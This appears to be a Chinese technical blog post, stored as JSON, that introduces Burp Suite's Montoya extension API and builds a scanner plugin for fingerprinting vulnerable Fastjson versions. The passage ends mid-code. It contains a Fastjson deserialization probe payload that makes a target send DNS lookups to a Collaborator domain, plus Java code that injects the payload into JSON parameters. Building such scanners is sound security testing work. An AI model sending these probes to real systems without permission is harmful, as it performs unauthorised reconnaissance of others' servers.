{"title":"Burp-Montoya","uid":"6412321264c6d157e1df07971f4aa071","slug":"Burp-Montoya","date":"2022-11-01T04:38:45.000Z","updated":"2023-04-12T02:36:51.327Z","comments":true,"path":"api/articles/Burp-Montoya.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221101/burp-suite-180820162011-thumbnail.5ag1ra9f7s0.jpg","content":"<p>  Burp的新版本更新了新的<code>API</code>接口，刚好最近有写插件的想法，所以简单的了解了下。</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20221101/images.4m31nsvvgdc0.png\" alt=\"images\"></p>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>  单从文档界面来看，结构清晰了不少-&gt;<a href=\"https://portswigger.github.io/burp-extensions-montoya-api/javadoc/burp/api/montoya/MontoyaApi.html\">MontoyaApi</a></p>\n<p><img src=\"https://wiki-1258274765.cos.ap-nanjing.myqcloud.com/wiki/img20221030132718.png\"></p>\n<p>  同时官方提供了一个<a href=\"https://github.com/PortSwigger/burp-extender-montoya-api\">demo</a></p>\n<h2 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h2><p>  与老版本类似，创建一个插件项目需要继承类<code>BurpExtension</code>，它只包含了一个初始化函数</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">BurpExtension</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">void</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MontoyaApi</span> var1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>  同样的，想要调用扫描等功能，也需要进行注册，比如我们注册一个扫描</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MontoyaApi</span> montoyaApi<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>montoyaApi <span class=\"token operator\">=</span> montoyaApi<span class=\"token punctuation\">;</span>\n    montoyaApi<span class=\"token punctuation\">.</span><span class=\"token function\">scanner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">registerScanCheck</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FastjsonCheck</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FastjsonCheck</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">ScanCheck</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">AuditIssue</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">activeAudit</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpRequestResponse</span> httpRequestResponse<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuditInsertionPoint</span> auditInsertionPoint<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">AuditIssue</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">passiveAudit</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpRequestResponse</span> httpRequestResponse<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">ConsolidationAction</span> <span class=\"token function\">consolidateIssues</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">AuditIssue</span> auditIssue<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuditIssue</span> auditIssue1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  与之前类似，<code>activeAudit</code>主动，<code>passiveAudit</code>被动，<code>consolidateIssues</code>定义重复问题的展示规则。<br>具体扫描逻辑与旧版本就大同小异了，不过新版本调用某些方法变得更加方便了，比如调用<code>collaborator</code>:</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">CollaboratorClient</span> collaboratorClient <span class=\"token operator\">=</span> montoyaApi<span class=\"token punctuation\">.</span><span class=\"token function\">collaborator</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">createClient</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//生成域名链接</span>\n<span class=\"token class-name\">String</span> payload <span class=\"token operator\">=</span> collaboratorClient<span class=\"token punctuation\">.</span><span class=\"token function\">generatePayload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//访问域名操作</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token comment\">//检查记录</span>\n<span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Interaction</span><span class=\"token punctuation\">&gt;</span></span> interactions <span class=\"token operator\">=</span> collaboratorClient<span class=\"token punctuation\">.</span><span class=\"token function\">getAllInteractions</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  报告的展示与旧版本基本相同，感觉只是变了名称</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">import</span> <span class=\"token namespace\">burp<span class=\"token punctuation\">.</span>api<span class=\"token punctuation\">.</span>montoya<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpService</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">burp<span class=\"token punctuation\">.</span>api<span class=\"token punctuation\">.</span>montoya<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">MarkedHttpRequestResponse</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">burp<span class=\"token punctuation\">.</span>api<span class=\"token punctuation\">.</span>montoya<span class=\"token punctuation\">.</span>scanner<span class=\"token punctuation\">.</span>audit<span class=\"token punctuation\">.</span>issues<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AuditIssue</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">burp<span class=\"token punctuation\">.</span>api<span class=\"token punctuation\">.</span>montoya<span class=\"token punctuation\">.</span>scanner<span class=\"token punctuation\">.</span>audit<span class=\"token punctuation\">.</span>issues<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AuditIssueConfidence</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">burp<span class=\"token punctuation\">.</span>api<span class=\"token punctuation\">.</span>montoya<span class=\"token punctuation\">.</span>scanner<span class=\"token punctuation\">.</span>audit<span class=\"token punctuation\">.</span>issues<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AuditIssueDefinition</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">burp<span class=\"token punctuation\">.</span>api<span class=\"token punctuation\">.</span>montoya<span class=\"token punctuation\">.</span>scanner<span class=\"token punctuation\">.</span>audit<span class=\"token punctuation\">.</span>issues<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AuditIssueSeverity</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">List</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @program: BurpMontoya\n * @description:\n * @author: Noel\n * @create: 2022-09-21 01:35\n **/</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ExampleAudit</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">AuditIssue</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> detail<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">HttpService</span> httpService<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">MarkedHttpRequestResponse</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> requestResponses<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">AuditIssueConfidence</span> confidence<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">AuditIssueSeverity</span> severity<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> baseurl<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">ExampleAudit</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> detail<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpService</span> httpService<span class=\"token punctuation\">,</span> <span class=\"token class-name\">MarkedHttpRequestResponse</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> requestResponses<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuditIssueSeverity</span> severity<span class=\"token punctuation\">,</span> <span class=\"token class-name\">AuditIssueConfidence</span> confidence<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> baseurl<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>detail <span class=\"token operator\">=</span> detail<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>httpService <span class=\"token operator\">=</span> httpService<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>requestResponses <span class=\"token operator\">=</span> requestResponses<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>severity <span class=\"token operator\">=</span> severity<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>confidence <span class=\"token operator\">=</span> confidence<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>baseurl <span class=\"token operator\">=</span> baseurl<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">detail</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> detail<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">remediation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">HttpService</span> <span class=\"token function\">httpService</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> httpService<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">baseUrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> baseurl<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">AuditIssueSeverity</span> <span class=\"token function\">severity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> severity<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">AuditIssueConfidence</span> <span class=\"token function\">confidence</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> confidence<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">MarkedHttpRequestResponse</span><span class=\"token punctuation\">&gt;</span></span> <span class=\"token function\">requestResponses</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">asList</span><span class=\"token punctuation\">(</span>requestResponses<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation punctuation\">@Override</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">AuditIssueDefinition</span> <span class=\"token function\">definition</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  这些结合起来便可以完成一个<code>Burp</code>插件的开发了</p>\n<h2 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h2><p>  前段时间出了<code>Fastjson 1.2.80</code>的利用与检测方式，刚好我们拿来做一个<code>Fastjson</code>检测的插件,<code>payload</code>如下:</p>\n<pre class=\"line-numbers language-json\" data-language=\"json\"><code class=\"language-json\"><span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.lang.Exception\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"com.alibaba.fastjson.JSONException\"</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token property\">\"x\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.net.InetSocketAddress\"</span><span class=\"token punctuation\">{</span><span class=\"token property\">\"address\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"val\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"80.DNS\"</span><span class=\"token punctuation\">}</span> <span class=\"token comment\">//  fastjson &lt; 1.2.83</span>\n\t\t<span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.lang.Exception\"</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"com.alibaba.fastjson.JSONException\"</span><span class=\"token punctuation\">,</span>\n\t\t<span class=\"token property\">\"message\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"java.net.InetSocketAddress\"</span><span class=\"token punctuation\">{</span><span class=\"token property\">\"address\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">,</span><span class=\"token property\">\"val\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"83_.DNS\"</span><span class=\"token punctuation\">}</span> <span class=\"token comment\">// fastjson = 1.2.83</span>\n\t\t<span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>  如果 <code>fastjson</code>版本低于<code>1.2.83</code>，<code>DNS</code>只会收到一个<code>80</code>开头的请求，方便我们进行版本判断。我们的检测思路就是遇到<code>json</code>格式的<code>body</code>或者<code>param</code>就全部替换为<code>payload</code>，具体操作如下：</p>\n<ol>\n<li>获取请求详情</li>\n</ol>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token class-name\">HttpRequest</span> request <span class=\"token operator\">=</span> httpRequestResponse<span class=\"token punctuation\">.</span><span class=\"token function\">httpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n获取参数\n<span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">ParsedHttpParameter</span><span class=\"token punctuation\">&gt;</span></span> parameters <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">parameters</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<ol start=\"2\">\n<li>判断参数值是否为<code>json</code>格式</li>\n</ol>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//utilities.urlUtils包含了对URL处理的函数，这里使用了decode，对URL进行解码</span>\nutilities<span class=\"token punctuation\">.</span><span class=\"token function\">urlUtils</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">startsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"{\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span>utilities<span class=\"token punctuation\">.</span><span class=\"token function\">urlUtils</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">value</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">startsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[\"</span><span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<ol start=\"3\">\n<li>生成<code>collaboratorClient</code>并发送请求</li>\n</ol>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">//生成collaborator链接</span>\n<span class=\"token class-name\">String</span> payload <span class=\"token operator\">=</span> collaboratorClient<span class=\"token punctuation\">.</span><span class=\"token function\">generatePayload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// poc</span>\n<span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> <span class=\"token class-name\">Fastjson_Payload</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"[\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"    {\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"        \\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.alibaba.fastjson.JSONException\\\",\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"\\t\\t\\\"x\\\":{\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"\\t\\t\\t\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"fastjson80.%s\\\"} \\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"\\t\\t}\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"    },\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"    {\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"        \\\"@type\\\":\\\"java.lang.Exception\\\",\\\"@type\\\":\\\"com.alibaba.fastjson.JSONException\\\",\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"\\t\\t\\\"message\\\":{\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"\\t\\t\\t\\\"@type\\\":\\\"java.net.InetSocketAddress\\\"{\\\"address\\\":,\\\"val\\\":\\\"fastjson83.%s\\\"} \\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"\\t\\t}\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"    }\\n\"</span> <span class=\"token operator\">+</span>\n        <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//更新参数为我们的poc</span>\n<span class=\"token class-name\">HttpRequest</span> rq <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">withUpdatedParameters</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpParameter</span><span class=\"token punctuation\">.</span><span class=\"token function\">parameter</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>utilities<span class=\"token punctuation\">.</span><span class=\"token function\">urlUtils</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Fastjson_Payload</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//发送请求</span>\n<span class=\"token class-name\">HttpRequestResponse</span> httpRequestResponse1 <span class=\"token operator\">=</span> http<span class=\"token punctuation\">.</span><span class=\"token function\">issueRequest</span><span class=\"token punctuation\">(</span>rq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol start=\"4\">\n<li>判断<code>dns</code>中是否包含有<code>fastjson83</code></li>\n</ol>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// 获取Collaborator服务器中所有与payload有关的请求信息</span>\n<span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Interaction</span><span class=\"token punctuation\">&gt;</span></span> interactions <span class=\"token operator\">=</span> collaboratorClient<span class=\"token punctuation\">.</span><span class=\"token function\">getInteractions</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">InteractionFilter</span><span class=\"token punctuation\">.</span><span class=\"token function\">interactionPayloadFilter</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Interaction</span> i <span class=\"token operator\">:</span>interactions<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token comment\">// i.dnsDetails()获取一个DnsDetails的Optional对象，DnsDetails有两个方法，一个是获取dns查询的byte数组 d.query()</span>\n<span class=\"token comment\">// 利用byteUtils().indexOf查询是否包含fastjson83</span>\n    flag <span class=\"token operator\">=</span> i<span class=\"token punctuation\">.</span><span class=\"token function\">dnsDetails</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>d <span class=\"token operator\">-&gt;</span>\n            utilities<span class=\"token punctuation\">.</span><span class=\"token function\">byteUtils</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> utilities<span class=\"token punctuation\">.</span><span class=\"token function\">byteUtils</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">convertFromString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fastjson83\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">isPresent</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" 